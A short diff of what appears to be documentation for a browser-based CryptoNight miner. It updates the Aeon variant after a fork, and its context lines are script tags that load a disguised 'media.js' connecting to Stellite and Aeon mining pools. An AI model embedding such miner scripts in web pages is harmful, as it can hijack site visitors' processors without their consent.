@@ -13,7 +13,7 @@ Attention: Special Case for some custom variant fork coins: Stellite and Intense
 <br><br>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=communitypool.stellite.cash:6677"> </script>
 <br><br>
-Attention: Aeon Cryptonight-lite ?algo=cn-lite?variant=0
+Attention: Aeon Cryptonight-lite ?algo=cn-lite?variant=1 ---> 06.06.18 | FORK AT BLOCK 963500 ---> use variant=1 now
 <br><br>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=0?jason=mine.supportaeon.com:3333"> </script>
 <br><br>
